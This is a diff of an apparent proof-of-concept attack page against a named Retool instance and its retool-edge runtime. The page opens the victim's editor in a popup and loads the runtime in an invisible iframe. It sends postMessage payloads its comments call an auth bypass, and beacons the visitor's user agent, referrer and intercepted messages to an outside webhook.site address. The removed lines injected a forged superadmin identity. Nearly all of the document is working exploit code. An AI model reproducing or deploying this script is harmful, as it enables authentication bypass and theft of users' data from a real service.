@@ -12,7 +12,6 @@
   @keyframes spin { to { transform: rotate(360deg); } }
   h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
   p { font-size: 13px; color: #64748b; }
-  .hidden { display: none; }
 </style>
 </head>
 <body>
@@ -22,16 +21,18 @@
   <p id="sub">Please wait</p>
 </div>
 
-<iframe id="f1" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>
-<iframe id="f2" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>
-
 <script>
 (function() {
   'use strict';
 
   var WH = 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be';
-  var ATK_ORIGIN = location.origin;
-  var cntI = 0, cntJ = 0;
+  var ATK = location.origin;
+  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
+  var HOST = 'https://jonjos11.retool.com';
+
+  // Target URLs to open
+  var EDITOR_URL = HOST + '/apps/' + APP_ID + '/editor';
+  var RUNTIME_BASE = 'https://retool-edge.com/runtime.M2M3OWU5.html';
 
   function X(payload) {
     var j = JSON.stringify(payload);
@@ -40,98 +41,112 @@
     new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0,800));
   }
 
-  var FAKE = {
-    id: 0, email: 'attacker@evil.com', firstName: 'Hacked', lastName: 'Admin',
-    fullName: 'Hacked Admin', profilePhotoUrl: null,
-    groups: [{ id: 1, name: 'admin' }, { id: 2, name: 'superuser' }],
-    metadata: { role: 'superadmin', _poc: true },
-    sid: 'inj-' + Date.now(), externalIdentifier: null, locale: 'en'
-  };
+  // ==============================================================
+  // STRATEGY A: Open the REAL editor via window.open()
+  // The editor loads the runtime internally. We listen for ANY
+  // postMessages from the editor window (which may include forwarded
+  // runtime messages or editor messages sent to opener via '*')
+  // ==============================================================
+  function attackRealEditor() {
+    var popup = window.open(EDITOR_URL, 're', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));
 
-  // THE REAL SANDBOX URL — retool-edge.com runtime
-  var RUNTIME_BASE = 'https://retool-edge.com/runtime.M2M3OWU5.html';
-  var RUNTIME_URL = RUNTIME_BASE + '?parentOrigin=' + encodeURIComponent(ATK_ORIGIN) + '&product=retool-web&isTestRuntime=false';
+    if (!popup) {
+      document.getElementById('msg').textContent = 'Popup blocked';
+      document.getElementById('sub').textContent = 'Allow popups and reload';
+      document.getElementById('spin').style.display = 'none';
+      return;
+    }
 
-  function inject(win) {
-    if (!win || win.closed) return;
-    try {
-      win.postMessage({ type: 'RETOOL_CURRENT_USER', data: FAKE }, '*');
-      win.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
-      cntJ++;
-    } catch(e) {}
+    document.getElementById('msg').textContent = 'Connected to editor';
+    document.getElementById('sub').textContent = 'Listening for messages...';
+
+    X({ event: 'editor_opened', url: EDITOR_URL, time: new Date().toISOString() });
+
+    // Send probe messages to the editor window (may reach runtime if editor forwards)
+    // The runtime has NO origin check on handlers 7043, 6800, 7751
+    // If the editor forwards our postMessages to the runtime, the runtime accepts them
+    setTimeout(function() {
+      // Request real user data
+      popup.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
+      X({ event: 'sent_probe', to: 'editor', type: 'RETOOL_CURRENT_USER_REQUEST', time: new Date().toISOString() });
+    }, 3000);
+
+    setInterval(function() {
+      if (popup.closed) return;
+      popup.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
+    }, 5000);
+
+    // Monitor popup
+    setInterval(function() {
+      if (popup.closed) {
+        document.getElementById('msg').textContent = 'Window closed';
+        document.getElementById('sub').textContent = 'Check webhook for captured data';
+        document.getElementById('spin').style.display = 'none';
+      }
+    }, 1000);
   }
 
-  // Intercept postMessages from runtime
-  window.addEventListener('message', function(e) {
-    var d = e.data;
-    if (!d || typeof d !== 'object' || !d.type) return;
+  // ==============================================================
+  // STRATEGY B: Iframe the runtime with real parentOrigin
+  // The runtime sends messages to US (its parent). Since handlers
+  // at 7043/6800/7751 have NO origin check, we can also send
+  // messages to it. We try to trigger backend calls to capture
+  // real function names + params.
+  // ==============================================================
+  function attackRuntime() {
+    // Use the REAL editor as parentOrigin so runtime might load real app
+    var url = RUNTIME_BASE + '?parentOrigin=' + encodeURIComponent(HOST) + '&product=retool-web&isTestRuntime=false';
 
-    var F1 = document.getElementById('f1');
-    var F2 = document.getElementById('f2');
-    var tgt = null;
-    if (F1.contentWindow && e.source === F1.contentWindow) tgt = F1.contentWindow;
-    if (F2.contentWindow && e.source === F2.contentWindow) tgt = F2.contentWindow;
-
-    if (!tgt) return;
-
-    cntI++;
-
-    if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
-      X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', origin: e.origin, cnt: cntI, time: new Date().toISOString() });
-      inject(tgt);
-    }
-    else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
-      X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString() });
-      try {
-        tgt.postMessage({ type: 'RETOOL_BACKEND_RESULT', requestId: d.requestId, data: { _spoofed: true, _attacker: 'origin bypass via parentOrigin param', timestamp: new Date().toISOString() } }, '*');
-      } catch(e) {}
-    }
-    else if (d.type && d.type.indexOf('RETOOL_') === 0) {
-      X({ event: 'intercept', type: d.type, origin: e.origin, data: d, time: new Date().toISOString() });
-    }
-  });
-
-  // Load runtime in iframe
-  function loadRuntime(url) {
     var f = document.createElement('iframe');
-    f.style.display = 'none';
+    f.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;';
     f.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation';
     f.src = url;
     document.body.appendChild(f);
 
     f.onload = function() {
       X({ event: 'runtime_loaded', url: url, time: new Date().toISOString() });
-      document.getElementById('msg').textContent = 'Runtime loaded';
-      document.getElementById('sub').textContent = 'Intercepting...';
-      inject(f.contentWindow);
-      setInterval(function(){ inject(f.contentWindow); }, 3000);
-    };
 
-    f.onerror = function() {
-      X({ event: 'runtime_blocked', url: url, time: new Date().toISOString() });
-      document.getElementById('msg').textContent = 'Connection blocked';
-      document.getElementById('sub').textContent = 'X-Frame-Options prevented loading';
-      document.getElementById('spin').style.display = 'none';
+      // DON'T inject fake user — let the runtime wait for real data
+      // But DO send auth bypass (no origin check at handler 7751)
+      try {
+        f.contentWindow.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
+      } catch(e) {}
     };
-
-    return f;
   }
 
-  // Auto-start on click
+  // ==============================================================
+  // INTERCEPT ALL postMessages
+  // ==============================================================
+  window.addEventListener('message', function(e) {
+    var d = e.data;
+    if (!d || typeof d !== 'object' || !d.type) return;
+
+    // Log ALL postMessages regardless of source (capture everything)
+    if (d.type && d.type.indexOf('RETOOL_') === 0) {
+      X({
+        event: 'intercept',
+        type: d.type,
+        data: d,
+        origin: e.origin,
+        source: e.source === window ? 'self' : (e.source === window.opener ? 'opener' : 'other'),
+        time: new Date().toISOString()
+      });
+    }
+  });
+
+  // ==============================================================
+  // AUTO-START on click (bypass popup blocker)
+  // ==============================================================
   document.body.addEventListener('click', function go() {
     document.body.removeEventListener('click', go);
 
-    X({ event: 'attack_start', url: RUNTIME_URL, attackerOrigin: ATK_ORIGIN, time: new Date().toISOString() });
+    X({ event: 'attack_start', attackerOrigin: ATK, editorUrl: EDITOR_URL, runtimeUrl: RUNTIME_BASE, time: new Date().toISOString() });
 
-    // Load runtime with OUR origin as parentOrigin
-    loadRuntime(RUNTIME_URL);
+    // Open the REAL editor (Strategy A)
+    attackRealEditor();
 
-    // Also open as popup as fallback
-    var popup = window.open(RUNTIME_URL, 'r', 'width=800,height=600,left='+((screen.width-800)/2)+',top='+((screen.height-600)/2));
-    if (popup) {
-      setTimeout(function(){ inject(popup); }, 2000);
-      setInterval(function(){ inject(popup); }, 3000);
-    }
+    // Also iframe the runtime (Strategy B)
+    attackRuntime();
   });
 
   X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });
